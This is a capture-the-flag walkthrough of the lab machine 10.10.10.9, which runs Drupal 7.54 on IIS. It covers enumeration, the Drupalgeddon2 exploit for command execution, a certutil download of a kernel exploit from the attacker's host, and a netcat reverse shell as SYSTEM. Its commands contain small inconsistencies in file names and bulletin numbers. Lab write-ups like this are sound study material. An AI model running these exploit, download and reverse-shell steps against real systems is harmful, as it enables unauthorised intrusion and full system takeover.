# IP Address: 10.10.10.9

# Enumeration

```
┌──(code㉿kali)-[~]
└─$ nmapAutomator.sh -H 10.10.10.9 -t all

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### HTTP
This is a drupal site. We use droopscan to enumerate.
```
┌──(code㉿kali)-[~/tools/droopescan]
└─$ droopescan  scan drupal -u http://10.10.10.9
[+] Plugins found:                                                              
    ctools http://10.10.10.9/sites/all/modules/ctools/
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/ctools/changelog.txt
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/ctools/LICENSE.txt
        http://10.10.10.9/sites/all/modules/ctools/API.txt
    libraries http://10.10.10.9/sites/all/modules/libraries/
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/libraries/changelog.txt
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/libraries/README.txt
        http://10.10.10.9/sites/all/modules/libraries/readme.txt
        http://10.10.10.9/sites/all/modules/libraries/README.TXT
        http://10.10.10.9/sites/all/modules/libraries/LICENSE.txt
    services http://10.10.10.9/sites/all/modules/services/
        http://10.10.10.9/sites/all/modules/services/README.txt
        http://10.10.10.9/sites/all/modules/services/readme.txt
        http://10.10.10.9/sites/all/modules/services/README.TXT
        http://10.10.10.9/sites/all/modules/services/LICENSE.txt
    profile http://10.10.10.9/modules/profile/
    php http://10.10.10.9/modules/php/
    image http://10.10.10.9/modules/image/

[+] Themes found:
    seven http://10.10.10.9/themes/seven/
    garland http://10.10.10.9/themes/garland/

[+] Possible version(s):
    7.54

[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.9/CHANGELOG.txt
    Default admin - http://10.10.10.9/user/login

```

Since the target is running Drupal 7.54, we check exploit-db for any interesting exploits. 
We find Drupalgeddon2. https://www.exploit-db.com/exploits/44449

# Exploitation

Run the exploit against the target and get remote command execution.
```
┌──(code㉿kali)-[~/tools/droopescan]
└─$ ./44449.rb http://10.10.10.9
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.9/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54

...

drupalgeddon2>> whoami
nt authority\iusr
```

# Privilege Escalation
We copy the output of `systeminfo` to our local machine and run windows-exploit-suggester against it. 
```
┌──(code㉿kali)-[~/tools]
└─$ ./windows-exploit-suggester.py --database 2021-11-17-mssb.xls --systeminfo systeminfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
...
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
...
[*] done
```


We try the pre-compiled exploit MS10-059.exe from https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059 by copying it to the target with `certutil`. After running the exploit, we see that a netcat listener needs to be setup on our local machine to receive the reverse shell. 

On target:
```
drupalgeddon2>> certutil -urlcache -split -f "http://10.10.14.17/exploit.exe
****  Online  ****
  000000  ...
  0bf800
CertUtil: -URLCache command completed successfully.
drupalgeddon2>> exploit2.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
drupalgeddon2>> exploit2.exe 10.10.14.17 443
```

Locally:
```
┌──(code㉿kali)-[~/tools/windows-kernel-exploits/MS10-059]
└─$ nc -nlvp 443                                                                                                                                  
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.9] 60884
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```


# Proof
user.txt

![user.txt](https://github.com/codetantrum/walkthroughs/blob/master/Bastard/images/Pasted%20image%2020211117183833.png)

root.txt

![root.txt](https://github.com/codetantrum/walkthroughs/blob/master/Bastard/images/Pasted%20image%2020211117183923.png)
